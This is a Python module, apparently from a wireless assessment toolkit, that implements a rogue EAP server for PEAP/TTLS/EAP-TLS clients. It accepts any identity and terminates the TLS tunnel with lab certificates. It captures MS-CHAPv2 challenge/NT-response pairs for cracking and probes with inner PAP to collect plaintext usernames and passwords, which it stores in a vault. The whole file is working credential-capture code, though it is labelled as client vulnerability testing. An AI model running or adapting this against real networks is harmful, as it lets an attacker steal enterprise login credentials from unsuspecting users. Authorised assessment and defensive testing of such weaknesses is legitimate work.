"""EAP lab server: PEAP/TTLS MS-CHAPv2 capture and EAP-TLS client-certificate observation."""
from __future__ import annotations

import hashlib
import os
import ssl
import struct
from collections import deque
from dataclasses import dataclass, field

from wifit3.campaigns.eap_lab_assessment import is_empty_nt_response
from wifit3.campaigns.eap_lab_config import EapLabLaunchConfig
from wifit3.campaigns.eap_lab_tls import LabTlsMaterial
from wifit3.crack.mschapv2 import (
    MsChapV2Capture,
    attach_server_challenge,
    build_mschapv2_challenge,
    parse_mschapv2_eap_payload,
)
from wifit3.dot11.eap import (
    EAP_FAILURE,
    EAP_REQUEST,
    EAP_RESPONSE,
    EAP_SUCCESS,
    EAP_TYPE_IDENTITY,
    EAP_TYPE_MSCHAPV2,
    EAP_TYPE_NAK,
    EAP_TYPE_PAP,
    EAP_TYPE_PEAP,
    EAP_TYPE_TLS,
    EAP_TYPE_TTLS,
    EAP_TLS_TYPES,
)
from wifit3.dot11.eapol import LLC_SNAP_EAPOL
from wifit3.dot11.enterprise import eap_tls_fragment


# hostapd / iOS PEAP: keep ServerHello+Certificate in one EAP frame.
# 900 B split the 940 B RSA flight into 900+40 and the iPhone ACKed then left.
_TLS_FRAGMENT_BYTES = 1398
_MAX_TLS_BYTES = 1_048_576
_MAX_INNER_EAP = 4096
_EAP_CODES = {EAP_REQUEST, EAP_RESPONSE, EAP_SUCCESS, EAP_FAILURE}
_TUNNELED_METHODS = frozenset({EAP_TYPE_PEAP, EAP_TYPE_TTLS})
_METHOD_NAMES = {
    EAP_TYPE_PEAP: "PEAP",
    EAP_TYPE_TTLS: "TTLS",
    EAP_TYPE_TLS: "EAP-TLS",
}


def _method_name(method: int | None) -> str:
    if method is None:
        return "EAP"
    return _METHOD_NAMES.get(method, f"EAP type {method}")


_TLS_HANDSHAKE = {
    1: "ClientHello",
    2: "ServerHello",
    11: "Certificate",
    12: "ServerKeyExchange",
    13: "CertificateRequest",
    14: "ServerHelloDone",
    15: "CertificateVerify",
    16: "ClientKeyExchange",
    20: "Finished",
}


def peap_flags_text(flags: int) -> str:
    bits = []
    if flags & 0x80:
        bits.append("L")
    if flags & 0x40:
        bits.append("M")
    if flags & 0x20:
        bits.append("S")
    label = "+".join(bits) or "-"
    return f"flags=0x{flags:02x} ({label} v{flags & 0x1F})"


_TLS_RECORD = {
    0x14: "ChangeCipherSpec",
    0x15: "Alert",
    0x16: "Handshake",
    0x17: "AppData",
}


def _is_tls_client_hello(fragment: bytes) -> bool:
    return len(fragment) >= 6 and fragment[0] == 0x16 and fragment[5] == 1


def tls_handshake_names(payload: bytes) -> list[str]:
    """Handshake / record types in a TLS flight. Truncated records are skipped."""
    names: list[str] = []
    index = 0
    while index + 5 <= len(payload):
        content_type = payload[index]
        length = int.from_bytes(payload[index + 3:index + 5], "big")
        record = payload[index + 5:index + 5 + length]
        index += 5 + length
        if len(record) < length:
            break
        if content_type != 0x16:
            names.append(_TLS_RECORD.get(content_type, f"rec {content_type}"))
            continue
        if names and names[-1] == "ChangeCipherSpec":
            names.append("Finished")
            continue
        offset = 0
        while offset + 4 <= len(record):
            handshake_type = record[offset]
            handshake_length = int.from_bytes(record[offset + 1:offset + 4], "big")
            names.append(_TLS_HANDSHAKE.get(handshake_type, f"hs {handshake_type}"))
            offset += 4 + handshake_length
    return names


def tls_content_hint(payload: bytes) -> str:
    if not payload:
        return "empty"
    names = tls_handshake_names(payload)
    if names:
        return f"TLS {'+'.join(names)} · {len(payload)} B"
    return f"TLS {len(payload)} B"


def describe_eap_tls_payload(eap_data: bytes) -> str:
    if not eap_data:
        return "empty"
    flags = eap_data[0]
    rest = eap_data[1:]
    if flags & 0x80 and len(rest) >= 4:
        rest = rest[4:]
    return f"{peap_flags_text(flags)} · {tls_content_hint(rest)}"


def _synthesize_peap_inner_response(buffer: bytes) -> tuple[bytes, int] | None:
    """Rebuild a full EAP-Response from PEAPv0 condensed type+payload bytes."""
    if not buffer:
        return None
    eap_type = buffer[0]
    payload = bytes(buffer[1:])
    if eap_type not in {EAP_TYPE_IDENTITY, EAP_TYPE_NAK, EAP_TYPE_PAP, EAP_TYPE_MSCHAPV2}:
        return None
    body = bytes([eap_type]) + payload
    return struct.pack(">BBH", EAP_RESPONSE, 0, 4 + len(body)) + body, len(buffer)


def _identity_payload(packet) -> bytes:
    payload = getattr(packet, "eap_data", b"")
    if payload:
        return payload
    raw = getattr(packet, "raw", b"")
    marker = raw.find(LLC_SNAP_EAPOL)
    if marker < 0:
        return b""
    eap_start = marker + len(LLC_SNAP_EAPOL) + 4
    if len(raw) < eap_start + 5 or raw[eap_start + 4] != EAP_TYPE_IDENTITY:
        return b""
    eap_length = int.from_bytes(raw[eap_start + 2:eap_start + 4], "big")
    return bytes(raw[eap_start + 5:min(eap_start + eap_length, len(raw))])


@dataclass(slots=True)
class PeapServerResult:
    outgoing: list[bytes] = field(default_factory=list)
    capture: MsChapV2Capture | None = None
    complete: bool = False
    failed: bool = False
    client_cert_fingerprint: str | None = None
    eap_method: int | None = None
    detail: str = ""
    misconfiguration: str | None = None
    rejected_lab: bool = False
    # (username, password) from inner PAP - persisted to Vault, never echoed in detail.
    lab_credential: tuple[str, str] | None = None


class _TlsServer:
    def __init__(self, material: LabTlsMaterial, *, request_client_cert: bool = False) -> None:
        context = material.server_context(request_client_cert=request_client_cert)
        self._incoming = ssl.MemoryBIO()
        self._outgoing = ssl.MemoryBIO()
        self.ssl = context.wrap_bio(self._incoming, self._outgoing, server_side=True)
        self.complete = False
        self.error: str | None = None

    def feed(self, incoming: bytes = b"") -> bytes:
        if incoming:
            self._incoming.write(incoming)
        if not self.complete:
            try:
                self.ssl.do_handshake()
                self.complete = True
            except ssl.SSLError as exc:
                if exc.reason not in ("WRONG_VERSION_NUMBER", "UNEXPECTED_EOF_WHILE_READING"):
                    if isinstance(exc, ssl.SSLSyscallError):
                        self.error = str(exc)
                    elif not isinstance(exc, ssl.SSLWantReadError | ssl.SSLWantWriteError):
                        self.error = str(exc)
            except ssl.SSLSyscallError as exc:
                self.error = str(exc)
        return self._drain_outgoing()

    def write_app(self, payload: bytes) -> bytes:
        try:
            self.ssl.write(payload)
        except ssl.SSLError as exc:
            if not isinstance(exc, ssl.SSLWantReadError | ssl.SSLWantWriteError):
                self.error = str(exc)
        return self._drain_outgoing()

    def read_app(self) -> bytes:
        try:
            return self.ssl.read(8192)
        except ssl.SSLError as exc:
            if isinstance(exc, ssl.SSLWantReadError | ssl.SSLWantWriteError):
                return b""
            self.error = str(exc)
            return b""

    def peer_cert_fingerprint(self) -> str | None:
        if not self.complete:
            return None
        try:
            der = self.ssl.getpeercert(binary_form=True)
        except (ValueError, ssl.SSLError):
            der = None
        if not der:
            return None
        return hashlib.sha256(der).hexdigest()

    def _drain_outgoing(self) -> bytes:
        chunks = []
        while self._outgoing.pending:
            chunks.append(self._outgoing.read())
        return b"".join(chunks)


class EapLabServerSession:
    """Outer EAP for PEAP/TTLS (MS-CHAPv2) and EAP-TLS client-certificate observation."""

    def __init__(
        self,
        material: LabTlsMaterial,
        *,
        eap_methods: tuple[int, ...] = (EAP_TYPE_PEAP, EAP_TYPE_TTLS, EAP_TYPE_TLS),
        launch: EapLabLaunchConfig | None = None,
    ) -> None:
        self._material = material
        self._launch = launch or EapLabLaunchConfig(timeout=300)
        self._method_queue = deque(
            method for method in eap_methods if method in EAP_TLS_TYPES
        )
        if not self._method_queue:
            self._method_queue = deque([EAP_TYPE_PEAP])
        self._active_method: int | None = None
        self._tls: _TlsServer | None = None
        self._next_eap_id = 1
        self._mschap_id = 0
        self._server_challenge = b""
        self._inner_username = ""
        self._inner_buffer = bytearray()
        self._incoming_tls = bytearray()
        self._tunnel_ready = False
        self._sent_mschap_challenge = False
        self._offered_inner_pap = False
        self._peap_version_flags = 0
        self._awaiting_method_reply = False
        self._method_start_version = 0
        self._peap_version_retried = False
        self._tls_frag_rest: list[bytes] = []
        self._tls_frag_last: bytes | None = None
        self._last_fed_tls = b""

    def method_offer_pending(self) -> bool:
        return self._awaiting_method_reply and self._active_method is not None

    def phase2_pending(self) -> bool:
        return self._tunnel_ready and not self._sent_mschap_challenge

    def awaiting_client_tls(self) -> bool:
        """True after ServerHello has gone out and the tunnel is not up yet."""
        return (
            self._tls is not None
            and not self._tunnel_ready
            and not self._tls_frag_rest
            and bool(self._last_fed_tls)
            and not self._tls.error
        )

    def on_eapol_start(self, bssid: bytes, client: bytes) -> PeapServerResult:
        return self._send_identity_request(bssid, client)

    def on_eap(self, bssid: bytes, client: bytes, packet) -> PeapServerResult:
        if packet.eap_code == EAP_RESPONSE and packet.eap_type == EAP_TYPE_IDENTITY:
            identity = _identity_payload(packet).decode("utf-8", errors="replace").strip()
            self._inner_username = identity
            result = self._start_next_method(bssid, client)
            if result.detail:
                result.detail = (
                    f"{result.detail} · accepted user {identity or '?'} (any identity)"
                )
            return result
        if packet.eap_code == EAP_RESPONSE and packet.eap_type == EAP_TYPE_NAK:
            self._awaiting_method_reply = False
            skipped = self._active_method
            if self._method_queue:
                result = self._start_next_method(bssid, client)
                if result.detail:
                    result.detail = f"{result.detail} · after NAK of {_method_name(skipped)}"
                return result
            return PeapServerResult(failed=True, detail="no supported EAP method")
        if packet.eap_code == EAP_RESPONSE and packet.eap_type in EAP_TLS_TYPES:
            if self._active_method != packet.eap_type:
                self._active_method = packet.eap_type
                self._tls = None
                self._tunnel_ready = False
            self._awaiting_method_reply = False
            if packet.eap_type in _TUNNELED_METHODS:
                return self._handle_tunneled_tls(bssid, client, packet)
            if packet.eap_type == EAP_TYPE_TLS:
                return self._handle_eap_tls(bssid, client, packet)
        if packet.eap_code == EAP_FAILURE:
            return PeapServerResult(failed=True, detail="client sent EAP-Failure")
        return PeapServerResult()

    def on_method_timeout(self, bssid: bytes, client: bytes) -> PeapServerResult:
        """Advance when the client stays silent (phones often skip NAK)."""
        if not self._awaiting_method_reply:
            return PeapServerResult()
        if (
            self._active_method == EAP_TYPE_PEAP
            and self._method_start_version == 1
            and not self._peap_version_retried
        ):
            self._peap_version_retried = True
            return self._emit_method_start(
                bssid,
                client,
                version=0,
                detail="→ PEAP start (v0 retry)",
            )
        skipped = self._active_method
        result = self._start_next_method(bssid, client)
        if result.detail and skipped is not None:
            result.detail = f"{result.detail} · after silent {_method_name(skipped)}"
        return result

    def on_phase2_timeout(self, bssid: bytes, client: bytes) -> PeapServerResult:
        if not self.phase2_pending():
            return PeapServerResult()
        return self._start_phase2(bssid, client, reason="after silent inner")

    def _start_next_method(self, bssid: bytes, client: bytes) -> PeapServerResult:
        if not self._method_queue:
            self._awaiting_method_reply = False
            return PeapServerResult(failed=True, detail="EAP method negotiation exhausted")
        self._active_method = self._method_queue.popleft()
        self._tls = None
        self._tunnel_ready = False
        self._sent_mschap_challenge = False
        self._offered_inner_pap = False
        self._inner_buffer.clear()
        self._peap_version_retried = False
        self._tls_frag_rest.clear()
        self._tls_frag_last = None
        self._last_fed_tls = b""
        version = 1 if self._active_method == EAP_TYPE_PEAP else 0
        return self._emit_method_start(bssid, client, version=version)

    def _emit_method_start(
        self,
        bssid: bytes,
        client: bytes,
        *,
        version: int,
        detail: str | None = None,
    ) -> PeapServerResult:
        from wifit3.dot11.eap import eap_tls_request_frame

        ident = self._next_eap_id
        self._next_eap_id = (self._next_eap_id + 1) & 0xFF
        self._method_start_version = version
        self._awaiting_method_reply = True
        name = _method_name(self._active_method)
        flags = 0x20 | (version & 0x1F)
        return PeapServerResult(
            outgoing=[
                eap_tls_request_frame(
                    bssid,
                    client,
                    ident,
                    self._active_method or EAP_TYPE_PEAP,
                    start=True,
                    version=version,
                ),
            ],
            eap_method=self._active_method,
            detail=detail or (
                f"→ {name} start · id={ident} · {peap_flags_text(flags)}"
            ),
        )

    def _send_identity_request(self, bssid: bytes, client: bytes) -> PeapServerResult:
        from wifit3.dot11.eap import eap_request_frame

        ident = self._next_eap_id
        self._next_eap_id = (self._next_eap_id + 1) & 0xFF
        return PeapServerResult(
            outgoing=[eap_request_frame(bssid, client, ident, EAP_TYPE_IDENTITY)],
            detail=f"→ EAP-Request Identity · id={ident}",
        )

    def _handle_eap_tls(self, bssid: bytes, client: bytes, packet) -> PeapServerResult:
        fed = self._feed_tls(packet)
        if self._tls is None:
            return PeapServerResult(failed=True)
        if self._tls.complete:
            fingerprint = self._tls.peer_cert_fingerprint()
            from wifit3.dot11.eap import eap_success_frame

            detail = "EAP-TLS completed"
            if fingerprint:
                detail += f"; client cert SHA-256 {fingerprint[:16]}…"
            return PeapServerResult(
                outgoing=[eap_success_frame(bssid, client, packet.eap_identifier)],
                complete=True,
                client_cert_fingerprint=fingerprint,
                eap_method=EAP_TYPE_TLS,
                detail=detail,
                misconfiguration=(
                    "untrusted_server_eap_tls"
                    if self._launch.security_assessment
                    else None
                ),
            )
        if self._tls.error:
            return self._tls_error_result()
        if fed.outgoing_tls:
            return self._emit_tls_frames(
                bssid,
                client,
                fed.outgoing_tls,
                detail=f"→ EAP-TLS · {tls_content_hint(fed.outgoing_tls)}",
            )
        return PeapServerResult(
            eap_method=EAP_TYPE_TLS,
            detail="EAP-TLS waiting for more fragments",
        )

    def _handle_tunneled_tls(self, bssid: bytes, client: bytes, packet) -> PeapServerResult:
        if self._active_method is None:
            return PeapServerResult(failed=True, detail="no active EAP method")
        if packet.eap_data:
            self._peap_version_flags = packet.eap_data[0] & 0x1F
        more, start, _total, fragment = eap_tls_fragment(packet.eap_data or b"")
        if not fragment and not start:
            if self._tls_frag_rest:
                return self._next_tls_fragment()
            if self.awaiting_client_tls():
                return PeapServerResult(eap_method=self._active_method)
            if self.phase2_pending():
                return self._start_phase2(bssid, client, reason="after TLS ACK")
            return PeapServerResult(eap_method=self._active_method)
        replay = self._is_tls_replay(fragment)
        if replay:
            return self._resend_tls_fragment("client retransmit")
        fed = self._feed_tls(packet)
        if self._tls is None:
            return PeapServerResult(failed=True, detail="TLS engine unavailable")
        if self._tls.error:
            return self._tls_error_result()
        self._last_fed_tls = fragment
        outgoing_tls = bytearray(fed.outgoing_tls)
        name = _method_name(self._active_method)
        if self._tls.complete and not self._tunnel_ready:
            self._tunnel_ready = True
            if outgoing_tls:
                return self._emit_tls_frames(
                    bssid,
                    client,
                    bytes(outgoing_tls),
                    detail=f"→ {name} · {tls_content_hint(bytes(outgoing_tls))} · TLS up",
                )
            return self._start_phase2(bssid, client, reason="TLS up")
        if self._tunnel_ready:
            inner = self._tls.read_app()
            if inner:
                inner_result = self._consume_inner(bssid, client, inner)
                if inner_result.capture or inner_result.failed or inner_result.complete:
                    return inner_result
        if outgoing_tls:
            return self._emit_tls_frames(
                bssid,
                client,
                bytes(outgoing_tls),
                detail=f"→ {name} · {tls_content_hint(bytes(outgoing_tls))}",
            )
        return PeapServerResult(
            eap_method=self._active_method,
            detail=f"{_method_name(self._active_method)} waiting for more TLS",
        )

    def _is_tls_replay(self, fragment: bytes) -> bool:
        """True only for the same bytes again, or a ClientHello after we already have one.

        ClientKeyExchange also starts with TLS content-type 0x16. Treating every
        0x16 flight as a replay resends ServerHello and stalls the iPhone.
        """
        if not fragment:
            return False
        if self._last_fed_tls and fragment == self._last_fed_tls:
            return True
        return bool(
            self._last_fed_tls
            and _is_tls_client_hello(fragment)
            and _is_tls_client_hello(self._last_fed_tls)
        )

    def _tls_error_result(self) -> PeapServerResult:
        error = self._tls.error if self._tls else "TLS error"
        lowered = (error or "").casefold()
        cert_reject = any(
            token in lowered
            for token in ("certificate", "unknown ca", "self signed", "verify failed")
        )
        return PeapServerResult(
            failed=True,
            detail=error or "TLS error",
            rejected_lab=cert_reject and self._launch.security_assessment,
        )

    def _emit_tls_frames(
        self,
        bssid: bytes,
        client: bytes,
        payload: bytes,
        *,
        start: bool = False,
        detail: str = "",
    ) -> PeapServerResult:
        frames = self._wrap_tls_eap(bssid, client, payload, start=start)
        if not frames:
            return PeapServerResult(eap_method=self._active_method, detail=detail)
        self._tls_frag_rest = frames[1:]
        self._tls_frag_last = frames[0]
        extra = ""
        total = 1 + len(self._tls_frag_rest)
        if total > 1:
            extra = f" · fragment 1/{total}"
        return PeapServerResult(
            outgoing=[frames[0]],
            eap_method=self._active_method,
            detail=(detail + extra) if detail else extra.lstrip(" ·"),
        )

    def _next_tls_fragment(self) -> PeapServerResult:
        if not self._tls_frag_rest:
            return PeapServerResult(eap_method=self._active_method)
        frame = self._tls_frag_rest.pop(0)
        self._tls_frag_last = frame
        left = len(self._tls_frag_rest)
        return PeapServerResult(
            outgoing=[frame],
            eap_method=self._active_method,
            detail=(
                f"→ {_method_name(self._active_method)} TLS fragment · "
                f"{left} remaining"
            ),
        )

    def _resend_tls_fragment(self, reason: str) -> PeapServerResult:
        if self._tls_frag_last is None:
            return PeapServerResult(
                eap_method=self._active_method,
                detail=f"ignored TLS retransmit · {reason}",
            )
        return PeapServerResult(
            outgoing=[self._tls_frag_last],
            eap_method=self._active_method,
            detail=f"→ {_method_name(self._active_method)} resend fragment · {reason}",
        )

    @dataclass(slots=True)
    class _TlsFeed:
        outgoing_tls: bytes = b""

    def _feed_tls(self, packet) -> _TlsFeed:
        if self._tls is None:
            want_client_cert = (
                self._active_method == EAP_TYPE_TLS
                and self._material.request_client_cert
            )
            self._tls = _TlsServer(
                self._material,
                request_client_cert=want_client_cert,
            )
        more, start, total_length, fragment = eap_tls_fragment(packet.eap_data)
        if total_length is not None and total_length > _MAX_TLS_BYTES:
            self._tls.error = "TLS payload too large"
            return self._TlsFeed()
        if start or total_length is not None:
            self._incoming_tls.clear()
        if len(self._incoming_tls) + len(fragment) > _MAX_TLS_BYTES:
            self._tls.error = "TLS reassembly too large"
            return self._TlsFeed()
        self._incoming_tls.extend(fragment)
        if more:
            return self._TlsFeed()
        incoming = bytes(self._incoming_tls)
        self._incoming_tls.clear()
        outgoing = self._tls.feed(incoming)
        return self._TlsFeed(outgoing_tls=outgoing)

    def _send_inner_identity_request(
        self,
        bssid: bytes,
        client: bytes,
    ) -> PeapServerResult:
        inner = self._build_inner_eap(EAP_REQUEST, EAP_TYPE_IDENTITY)
        outgoing_tls = self._tls.write_app(inner) if self._tls else b""
        return self._emit_tls_frames(
            bssid,
            client,
            outgoing_tls,
            detail=f"→ {_method_name(self._active_method)} inner EAP-Request Identity",
        )

    def _consume_inner(
        self,
        bssid: bytes,
        client: bytes,
        data: bytes,
    ) -> PeapServerResult:
        self._inner_buffer.extend(data)
        for packet in self._iter_inner_packets():
            if packet[0] != EAP_RESPONSE:
                continue
            eap_type = packet[4] if len(packet) >= 5 else None
            if eap_type == EAP_TYPE_IDENTITY:
                self._inner_username = packet[5:].split(b"\x00", 1)[0].decode(
                    "utf-8",
                    errors="replace",
                ).strip() or self._inner_username
                seen = f"← inner Identity ({self._inner_username or '?'})"
                if self._wants_pap_probe():
                    result = self._send_inner_pap_request(bssid, client)
                    result.detail = f"{seen} · {result.detail}" if result.detail else seen
                    return result
                result = self._send_mschap_challenge(bssid, client)
                result.detail = f"{seen} · {result.detail}" if result.detail else seen
                return result
            if eap_type == EAP_TYPE_PAP:
                return self._handle_inner_pap(bssid, client, packet[5:])
            if eap_type == EAP_TYPE_NAK and self._offered_inner_pap:
                result = self._send_mschap_challenge(bssid, client)
                prefix = "← inner NAK of PAP"
                result.detail = f"{prefix} · {result.detail}" if result.detail else prefix
                return result
            if eap_type == EAP_TYPE_MSCHAPV2:
                capture = parse_mschapv2_eap_payload(packet[5:])
                if capture is None:
                    return PeapServerResult(
                        eap_method=self._active_method,
                        detail="← inner MS-CHAPv2 accepted (unparsed body)",
                    )
                if (
                    capture.username in ("", "unknown")
                    and self._inner_username
                ):
                    capture = MsChapV2Capture(
                        username=self._inner_username,
                        server_challenge=capture.server_challenge,
                        peer_challenge=capture.peer_challenge,
                        nt_response=capture.nt_response,
                        flags=capture.flags,
                    )
                capture = attach_server_challenge(capture, self._server_challenge)
                from wifit3.dot11.eap import eap_success_frame

                misconfig = None
                if self._launch.security_assessment:
                    if (
                        self._launch.probe_empty_mschap
                        and is_empty_nt_response(capture.nt_response)
                    ):
                        misconfig = "empty_mschap_accepted"
                    else:
                        misconfig = "untrusted_server_mschapv2"
                nt_len = len(capture.nt_response)
                challenge_hex = capture.server_challenge.hex()
                return PeapServerResult(
                    outgoing=[eap_success_frame(bssid, client, self._alloc_eap_id())],
                    capture=capture,
                    complete=True,
                    eap_method=self._active_method,
                    detail=(
                        f"← inner MS-CHAPv2 Response · user {capture.username} · "
                        f"challenge {challenge_hex} · NT-response {nt_len} B"
                    ),
                    misconfiguration=misconfig,
                )
        return PeapServerResult()

    def _wants_pap_probe(self) -> bool:
        return (
            self._launch.security_assessment
            and self._launch.probe_inner_pap
            and not self._offered_inner_pap
        )

    def _send_inner_pap_request(
        self,
        bssid: bytes,
        client: bytes,
    ) -> PeapServerResult:
        self._offered_inner_pap = True
        inner = self._build_inner_eap(EAP_REQUEST, EAP_TYPE_PAP)
        outgoing_tls = self._tls.write_app(inner) if self._tls else b""
        return self._emit_tls_frames(
            bssid,
            client,
            outgoing_tls,
            detail=(
                f"→ {_method_name(self._active_method)} inner PAP probe "
                f"(client vuln test · user {self._inner_username or '?'})"
            ),
        )

    def _handle_inner_pap(
        self,
        bssid: bytes,
        client: bytes,
        pap_payload: bytes,
    ) -> PeapServerResult:
        from wifit3.dot11.eap import eap_success_frame

        password = pap_payload.decode("utf-8", errors="replace").strip("\x00")
        user = self._inner_username or "unknown"
        sent_secret = bool(password.strip())
        if sent_secret:
            detail = (
                f"← inner PAP accepted · user {user} · "
                "client sent credentials inside the tunnel (vulnerable · saved to Vault)"
            )
        else:
            detail = (
                f"← inner PAP accepted · user {user} · "
                "empty password (vulnerable · saved to Vault)"
            )
        return PeapServerResult(
            outgoing=[eap_success_frame(bssid, client, self._alloc_eap_id())],
            complete=True,
            eap_method=self._active_method,
            detail=detail,
            lab_credential=(user, password),
            misconfiguration=(
                "inner_pap_accepted"
                if self._launch.security_assessment
                else None
            ),
        )

    def _start_phase2(
        self,
        bssid: bytes,
        client: bytes,
        *,
        reason: str,
    ) -> PeapServerResult:
        if self._wants_pap_probe():
            result = self._send_inner_pap_request(bssid, client)
        else:
            result = self._send_mschap_challenge(bssid, client)
        extra = f" · {reason}"
        result.detail = f"{result.detail}{extra}" if result.detail else extra.lstrip(" ·")
        return result

    def _send_mschap_challenge(
        self,
        bssid: bytes,
        client: bytes,
    ) -> PeapServerResult:
        if self._sent_mschap_challenge:
            return PeapServerResult()
        self._sent_mschap_challenge = True
        self._mschap_id = (self._mschap_id + 1) & 0xFF
        self._server_challenge = os.urandom(16)
        body = build_mschapv2_challenge(self._mschap_id, self._server_challenge)
        inner = self._build_inner_eap(EAP_REQUEST, EAP_TYPE_MSCHAPV2, body)
        outgoing_tls = self._tls.write_app(inner) if self._tls else b""
        user = self._inner_username or "?"
        return self._emit_tls_frames(
            bssid,
            client,
            outgoing_tls,
            detail=(
                f"→ {_method_name(self._active_method)} inner MS-CHAPv2 Challenge · "
                f"user {user} · challenge {self._server_challenge.hex()}"
            ),
        )

    def _alloc_eap_id(self) -> int:
        ident = self._next_eap_id
        self._next_eap_id = (self._next_eap_id + 1) & 0xFF
        return ident

    def _build_inner_eap(self, code: int, eap_type: int, data: bytes = b"") -> bytes:
        body = bytes([eap_type]) + data
        return struct.pack(">BBH", code, self._alloc_eap_id(), 4 + len(body)) + body

    def _iter_inner_packets(self):
        while self._inner_buffer:
            if self._inner_buffer[0] == 0 and len(self._inner_buffer) > 1:
                self._inner_buffer.pop(0)
                continue
            if len(self._inner_buffer) >= 4:
                code = self._inner_buffer[0]
                length = struct.unpack(">H", self._inner_buffer[2:4])[0]
                if code in _EAP_CODES and 4 <= length <= _MAX_INNER_EAP:
                    if len(self._inner_buffer) < length:
                        break
                    packet = bytes(self._inner_buffer[:length])
                    del self._inner_buffer[:length]
                    yield packet
                    continue
            synthesized = _synthesize_peap_inner_response(bytes(self._inner_buffer))
            if synthesized is None:
                break
            packet, consumed = synthesized
            del self._inner_buffer[:consumed]
            yield packet

    def _wrap_tls_eap(
        self,
        bssid: bytes,
        client: bytes,
        payload: bytes,
        *,
        start: bool = False,
    ) -> list[bytes]:
        from wifit3.dot11.eap import eap_tls_request_frame

        if not payload and not start:
            return []
        if self._active_method is None:
            return []
        identifier = self._alloc_eap_id()
        frames: list[bytes] = []
        offset = 0
        total = len(payload)
        while offset < total or (start and not frames):
            chunk = payload[offset: offset + _TLS_FRAGMENT_BYTES]
            offset += len(chunk)
            more = offset < total
            first = not frames
            frames.append(
                eap_tls_request_frame(
                    bssid,
                    client,
                    identifier,
                    self._active_method,
                    chunk,
                    more=more,
                    start=start and first and not chunk,
                    total_length=total if first and total else None,
                    version=(
                        self._peap_version_flags
                        if self._active_method == EAP_TYPE_PEAP
                        else 0
                    ),
                ),
            )
            if start and first and not chunk:
                break
        return frames


PeapServerSession = EapLabServerSession
